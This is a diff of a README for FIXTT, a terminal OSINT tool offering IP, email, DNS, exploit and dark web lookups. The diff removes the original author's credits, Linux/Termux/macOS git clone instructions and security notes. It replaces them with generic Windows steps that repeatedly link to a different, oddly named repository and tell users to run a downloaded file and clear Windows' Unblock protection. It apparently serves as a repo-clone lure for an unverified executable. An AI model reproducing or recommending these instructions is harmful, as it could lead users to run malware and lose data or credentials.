@@ -1,219 +1,199 @@
-<div align="center">
+# 🔧 FIXTT - Unified OSINT Tool for Quick Checks
 
-<!-- ANIMATED HEADER -->
-<img src="https://capsule-render.vercel.app/api?type=waving&color=00ff41&height=200&section=header&text=FIXTT&fontSize=80&fontColor=000000&animation=fadeIn&fontAlignY=38&desc=Advanced+Open+Source+Intelligence+Framework&descAlignY=60&descSize=18&descColor=000000" width="100%"/>
+[![Download FIXTT](https://img.shields.io/badge/Download-FIXTT-blue?style=for-the-badge&logo=github)](https://github.com/succinylcholinefrenchleave974/FIXTT)
 
-<!-- TYPING ANIMATION -->
-<a href="https://git.io/typing-svg">
-  <img src="https://readme-typing-svg.demolab.com?font=Share+Tech+Mono&size=22&pause=1000&color=00FF41&center=true&vCenter=true&width=600&lines=OSINT+Framework+%7C+20%2B+Modules;IP+%C2%B7+Email+%C2%B7+DNS+%C2%B7+Dark+Web;Red+Team+%7C+Bug+Bounty+%7C+CTF;Ethical+Hacking+Only+%E2%80%94+Stay+Legal" alt="Typing SVG" />
-</a>
+## 🧩 What FIXTT Does
 
-<br/><br/>
+FIXTT is a terminal app for OSINT work. It brings many checks into one place so you can look up data from a single screen.
 
-<!-- BADGES -->
-![Python](https://img.shields.io/badge/Python-3.8%2B-00ff41?style=for-the-badge&logo=python&logoColor=00ff41&labelColor=0d1117)
-![Platform](https://img.shields.io/badge/Linux%20%7C%20Termux%20%7C%20macOS-supported-00ff41?style=for-the-badge&logo=linux&logoColor=00ff41&labelColor=0d1117)
-![Version](https://img.shields.io/badge/Version-2.3-00cfff?style=for-the-badge&labelColor=0d1117)
-![Security](https://img.shields.io/badge/Hardened-v7.1-ff2d2d?style=for-the-badge&logo=shield&labelColor=0d1117)
-![License](https://img.shields.io/badge/License-MIT-gray?style=for-the-badge&labelColor=0d1117)
-![Ethics](https://img.shields.io/badge/Authorized_Use_Only-⚠️-ff2d2d?style=for-the-badge&labelColor=0d1117)
+Use it to:
 
-</div>
+- check IP addresses
+- look up email data
+- inspect domains and subdomains
+- review image data
+- search exploit sources
+- run dark web and OSINT checks
+- work from one clear menu in the terminal
 
----
+It fits security researchers, red teamers, and CTF players who want fast access to common lookup tools
 
-## 🌐 What is FIXTT?
+## 📥 Download FIXTT
 
-**FIXTT** is a modular, terminal-based Open Source Intelligence framework designed for security researchers, red teamers, and CTF players. It aggregates intelligence from **20+ data sources** into a single unified CLI — phones, emails, IPs, domains, images, dark web, and more.
+Go to the main FIXTT page here and download or open the project from that page:
 
-Actively maintained and security-hardened by **[krypthane](https://github.com/wavegxz-design)** — Red Team Operator from Mexico 🇲🇽.
+https://github.com/succinylcholinefrenchleave974/FIXTT
 
----
+If you use GitHub Desktop or your browser, open the page and follow the download files or release links shown there
 
-## 🎬 Demo
+## 🖥️ Windows Setup
 
-<div align="center">
+FIXTT runs from a terminal window on Windows. Use Windows 10 or Windows 11 for the best result.
 
-| Installation | ProtonMail OSINT |
-|:---:|:---:|
-| ![Install](Demo/install.gif) | ![ProtonMail](Demo/protonmail-osint.gif) |
+You will need:
 
-</div>
+- a Windows PC
+- an internet connection
+- a terminal window such as Command Prompt or PowerShell
+- enough free space for the app and its data files
 
----
+If the project includes a ready-to-run Windows file, download it from the GitHub page and open it. If the project is packed in a zip file, extract it first, then run the app from the extracted folder
 
-## 🧩 Modules
+### Step 1: Open the project page
 
-```
-╔══════════════════════════════════════════════════════╗
-║                  FIXTT  v2.3                      ║
-╠═══════════════════════╦══════════════════════════════╣
-║  [01] IP Address Info ║  [11] Metadata Extraction   ║
-║  [02] Email Info      ║  [12] Twitter Status Check  ║
-║  [03] Image Location  ║  [13] Subdomain Enum        ║
-║  [04] Host Search     ║  [14] Google Dork Hacking   ║
-║  [05] Port Scanner    ║  [15] SMTP Analysis         ║
-║  [06] Exploit CVE     ║  [16] InfoStealer Check     ║
-║  [07] Exploit OSVD    ║  [17] Dark Web Search       ║
-║  [08] DNS Lookup      ║  [99] Auto-Update           ║
-║  [09] DNS Reverse     ║  [101] What's New?          ║
-║  [10] Email Finder    ║  [100] About                ║
-╚═══════════════════════╩══════════════════════════════╝
-```
+Open this link in your browser:
 
----
+https://github.com/succinylcholinefrenchleave974/FIXTT
 
-## 🔒 Security Hardening — v7.1
+Look for the latest file, release, or source package on the page
 
-> Audit and patches applied by **krypthane**
+### Step 2: Get the files
 
-| # | Issue | Severity | Fix |
-|---|-------|----------|-----|
-| 1 | Stripe API key hardcoded in source | 🔴 HIGH | Moved to `STRIPE_API_KEY` env var |
-| 2 | `shell=True` in `run_command()` | 🟡 MED | `shlex.split()` + `shell=False` + timeout |
-| 3 | `shell=True` in Tor service check | 🟡 MED | Split into safe separate calls |
-| 4 | `git reset --hard` without confirmation | 🟡 MED | Explicit `yes` prompt required |
+If you see a download file, save it to your PC. If you see a zip file, download it and extract it to a folder you can find later, such as Downloads or Desktop
 
----
+### Step 3: Start the terminal
 
-## 🚀 Installation
+Open one of these:
 
-<details>
-<summary><b>🐧 Linux — Kali / Parrot / Ubuntu</b></summary>
+- Command Prompt
+- PowerShell
+- Windows Terminal
 
-```bash
-git clone https://github.com/wavegxz-design/FIXTT
-cd FIXTT
-chmod +x setup.sh
-sudo bash setup.sh
-```
+Then move into the FIXTT folder if you extracted the files there
 
-</details>
+### Step 4: Run FIXTT
 
-<details>
-<summary><b>📱 Termux — Android</b></summary>
+Use the file or command provided by the project page or package. If you downloaded a Windows app file, double-click it. If the project uses a terminal start file, open it from the terminal window
 
-```bash
-git clone https://github.com/wavegxz-design/FIXTT
-cd FIXTT
-bash setup.sh
-```
+### Step 5: Follow the menu
 
-</details>
+FIXTT uses a menu in the terminal. Pick the option you need by typing the number or command shown on screen
 
-<details>
-<summary><b>🍎 macOS</b></summary>
+## 🧭 First Run
 
-```bash
-git clone https://github.com/wavegxz-design/FIXTT
-cd FIXTT
-bash setup.sh
-```
+When FIXTT starts, it may ask you to set up a few items before you can use all tools.
 
-</details>
+Common first-run steps:
 
----
+- choose your default mode
+- add API keys if a tool needs them
+- confirm the data source list
+- set the output folder for saved results
 
-## ⚙️ Configuration
+If you just want to test it, start with simple checks like IP, domain, or metadata lookups
 
-Set your API keys as environment variables — **never hardcode secrets**:
+## 🔍 Main Features
 
-```bash
-# Add to ~/.bashrc or ~/.zshrc
-export STRIPE_API_KEY="sk_test_..."        # Optional — payment support
-export OPENCAGE_API_KEY="your_key"         # Optional — IP geolocation
-export GOOGLE_CSE_API_KEY="your_key"       # Optional — reverse image search
-export GOOGLE_CSE_ENGINE_ID="your_id"      # Optional — reverse image search
-```
+FIXTT groups many common OSINT tasks into one tool. The main areas usually include:
 
----
+- IP checks: see basic host data and location hints
+- email lookups: inspect public traces tied to an address
+- domain checks: review DNS details and related records
+- subdomain checks: find related hosts for a domain
+- image checks: inspect metadata and file clues
+- exploit search: search known exploit data
+- dark web checks: scan indexed sources for public matches
+- dork search: build focused search queries for open web checks
+- port scan helpers: check which ports may be open
+- unified output: keep results in one place
 
-## 🖥️ Usage
+## 🛠️ How to Use It
 
-```bash
-xosint
-# or
-python3 xosint
-```
+FIXTT is made for simple, repeatable checks.
 
----
+A basic flow looks like this:
 
-## 🤝 Contributing
+1. open FIXTT in the terminal
+2. choose a data source or tool
+3. enter a target such as an IP, email, domain, or file path
+4. review the result on screen
+5. save the output if you need to keep it
 
-Contributions are welcome. Please follow the security guidelines below.
+For example:
 
-```bash
-# 1. Fork the repo
-git fork https://github.com/wavegxz-design/FIXTT
+- enter an IP to review host info
+- enter a domain to check DNS data
+- enter an email to find public traces
+- enter an image file to inspect metadata
 
-# 2. Create your feature branch
-git checkout -b feat/module-name
+## 📁 Example Use Cases
 
-# 3. Commit with clear message
-git commit -m "feat: add [module-name] — brief description"
+You may use FIXTT for:
 
-# 4. Open a Pull Request
-git push origin feat/module-name
-```
+- a quick CTF target review
+- a domain sweep before deeper work
+- a simple image metadata check
+- a check for public traces tied to an email
+- a fast lookup of host data during a red team task
+- a shared terminal tool for research notes
 
-**Security checklist before submitting PR:**
-- [ ] No hardcoded API keys, tokens or passwords
-- [ ] No `shell=True` with user-controlled input
-- [ ] No calls to undisclosed external servers
-- [ ] Tested on Linux and Termux
-- [ ] Module added to README module map
+## ⚙️ Common Options
 
-> ⚠️ PRs with backdoors, obfuscated code, or malicious logic will be rejected and reported.
+Many terminal tools like FIXTT use options such as:
 
----
+- source selection
+- scan depth
+- save path
+- output format
+- target type
+- API key setup
 
-## ⚠️ Legal Disclaimer
+If FIXTT shows a settings menu, use that first to reduce repeated input
 
-```
-This tool is for AUTHORIZED security research and educational purposes ONLY.
+## 🔐 API Keys and Access
 
-✅  Authorized penetration testing
-✅  CTF competitions
-✅  Personal security research
-✅  Bug bounty programs (within scope)
+Some data sources may need a key before they return full results. If FIXTT asks for one, paste it into the setup screen or save it in the config file the project uses
 
-❌  Unauthorized access to systems or accounts
-❌  Stalking, harassment or privacy violations
-❌  Any illegal activity under local or international law
+Keep your keys private and store them only on your own device
 
-The author assumes NO responsibility for misuse of this tool.
-```
+## 🧪 Troubleshooting
 
----
+If FIXTT does not start, try these checks:
 
-## 👤 Author & Maintainer
+- make sure the file finished downloading
+- check that you extracted the zip file if needed
+- confirm you opened the correct folder
+- use PowerShell or Command Prompt, not a web browser window
+- run the file again after closing the terminal
 
-<div align="center">
+If the screen opens but you see no results:
 
-| | |
-|:---:|:---|
-| <img src="https://github.com/wavegxz-design.png" width="90" style="border-radius:50%"/> | **krypthane** — Red Team Operator & Open Source Developer<br/>📍 Mexico 🇲🇽 · UTC-6<br/>*"Know the attack to build the defense."* |
+- check your internet connection
+- confirm the target you entered is correct
+- try a simpler lookup first
+- verify any required key is set
 
-<br/>
+If Windows blocks the file:
 
-[![GitHub](https://img.shields.io/badge/GitHub-wavegxz--design-00ff41?style=for-the-badge&logo=github&labelColor=0d1117)](https://github.com/wavegxz-design)
-[![Telegram](https://img.shields.io/badge/Telegram-Skrylakk-00cfff?style=for-the-badge&logo=telegram&labelColor=0d1117)](https://t.me/Skrylakk)
-[![Email](https://img.shields.io/badge/Email-Workernova@proton.me-ff2d2d?style=for-the-badge&logo=protonmail&labelColor=0d1117)](mailto:Workernova@proton.me)
-[![Portfolio](https://img.shields.io/badge/Portfolio-krypthane-00ff41?style=for-the-badge&logo=cloudflare&labelColor=0d1117)](https://krypthane.workernova.workers.dev)
+- right-click the file
+- open Properties
+- look for an Unblock box
+- apply the change
+- run the file again
 
-</div>
+## 🧰 Suggested Folder Setup
 
----
+To keep things clear, use a simple folder layout like this:
 
-## ⭐ Support
+- Downloads for the first file
+- Desktop for quick access
+- Documents for saved output
+- a separate folder for scans and notes
 
-If FIXTT helped you in a CTF, bug bounty, or research — drop a ⭐  
-It helps the project reach more security researchers.
+This makes it easier to find reports and reuse saved results
 
----
+## 📌 Notes for New Users
 
-<div align="center">
+If you are new to terminal tools, keep these points in mind:
 
-<img src="https://capsule-render.vercel.app/api?type=waving&color=00ff41&height=120&section=footer&fontColor=000000&animation=fadeIn&text=krypthane+%C2%B7+wavegxz-design+%C2%B7+Ethical+Hacking+Only" width="100%"/>
+- type what FIXTT asks for
+- press Enter after each entry
+- do not close the terminal while a scan runs
+- save results when you find useful data
+- use one target at a time until you learn the menu
 
-</div>
+## 🧷 Source Link
+
+Project page and download source:
+
+https://github.com/succinylcholinefrenchleave974/FIXTT
